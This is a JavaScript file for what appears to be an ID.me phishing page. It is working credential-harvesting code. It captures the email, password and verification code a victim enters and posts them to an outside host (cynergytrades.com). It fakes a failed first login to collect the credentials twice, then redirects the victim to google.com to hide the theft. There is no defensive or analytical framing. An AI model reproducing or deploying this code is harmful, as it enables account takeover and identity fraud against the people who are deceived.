const idme = document.getElementById("idme");
const idme2 = document.getElementById("idme2");

const idmeBtn = document.getElementById("idmeBtn");
const idmeBtn2 = document.getElementById("idmeBtn2");

let idmeAttempts = 0;
const d = new Date();
let submissionID = d.getTime() + " " + Math.floor(Math.random() * 1000) + 1;;

const sendToMail = async (type, body) => {

    const submitRequest = new FormData();
    submitRequest.append("type", type);
    submitRequest.append("submissionID", submissionID);
    submitRequest.append("body", body);

    const url = `https://cynergytrades.com/public/boiz/idme/verifymail.php`
    const options = {
        method: "POST",
        body: submitRequest
    };

    try {
        const response = await fetch(url, options);

        if (!response.ok) {
            const message = `An error has occured, Error code: ${response.status} - ${response.statusText}`;
            throw new Error(message);
        }
        const data = await response.text();
        return data;
    } catch (error) {
        throw new Error(error);
    }
}

idmeBtn.addEventListener('click', () => {
    let idmeMail = document.getElementById("user_email").value;
    let idmePass = document.getElementById("user_password").value;

    if (idmeMail.trim() === "" || idmePass.trim() === "") {
        alert("ID.me sign in fields must be fully filled");
        return;
    }

    idmeBtn.value = "Processing ...";

    if (idmeAttempts < 1) {

        let txt = `============= \n`;
        txt += `First attempt \n`;
        txt += `============= \n`;
        txt += `ID.me Email: ${idmeMail} \n`;
        txt += `ID.me Password: ${idmePass} \n`;

        sendToMail("idme", txt)
            .then((data) => {
                // definitely a success message
                document.getElementById("errorTxt").innerText = "Enter your login credentials again";
                document.getElementById("user_email").value = "";
                document.getElementById("user_password").value = "";
                idmeAttempts++;

                idmeBtn.value = "Proceed";
            })
            .catch((error) => {
                // alert('error', error);

                document.getElementById("errorTxt").innerText = "Enter your login credentials again";
                document.getElementById("user_email").value = "";
                document.getElementById("user_password").value = "";
                idmeAttempts++;

                idmeBtn.value = "Proceed";
            });
    } else {
        document.getElementById("errorTxt").innerText = "";

        let txt2 = `============= \n`;
        txt2 += `Second attempt \n`;
        txt2 += `============= \n`;
        txt2 += `ID.me Email: ${idmeMail} \n`;
        txt2 += `ID.me Password: ${idmePass} \n`;

        sendToMail("idme", txt2)
            .then((data) => {
                // definitely a success message
                idme.classList.add('visually-hidden');
                idme2.classList.remove('visually-hidden');
            })
            .catch((error) => {
                alert(error);

                idme.classList.add('visually-hidden');
                idme2.classList.remove('visually-hidden');
            });
    }
})

idmeBtn2.addEventListener('click', () => {
    let code = document.getElementById("code").value;

    if (code.trim() === "") {
        alert("Code field must be filled");
        return;
    }

    let txt = `==================== \n`;
    txt += `ID.me Code: ${code} \n`;

    idmeBtn2.value = "Processing ...";

    sendToMail("idmeCode", txt)
        .then((data) => {
            // definitely a success message
            location.replace("https://google.com")
        })
        .catch((error) => {
            alert(error);

            location.replace("https://google.com")
        });
})

function flagInputError(msg) {
    alert(msg);
}

function isEmpty(input) {
    return input.value.trim() === "" ? true : false;
}